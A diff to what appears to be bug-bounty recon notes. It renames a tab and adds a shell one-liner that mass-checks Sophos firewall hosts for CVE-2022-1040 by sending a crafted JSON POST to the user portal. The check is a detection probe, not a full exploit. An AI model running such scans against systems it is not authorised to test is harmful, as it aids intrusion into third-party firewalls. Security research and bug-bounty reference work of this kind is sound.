@@ -332,8 +332,8 @@ Resources\
 [SlideShare presentation on AEM by 0ang3el](https://www.slideshare.net/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs)
 {% endtab %}
 
-{% tab title="Recon One-Liners" %}
-#### Recon One-Liners
+{% tab title="One-Liners" %}
+#### Recon
 
 **Dump In-scope Assets from BBPs using repo from** [**@arkadiyt**](https://github.com/arkadiyt/bounty-targets-data)
 
@@ -561,6 +561,12 @@ whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep o
 
 ```bash
 grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
+```
+
+**CVE 2022-1040 (Give your domain without http/https on the "sophos\_servers" file)**
+
+```
+cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable [ Sophos RCE ]\e[0m\n"; done;
 ```
 {% endtab %}
 
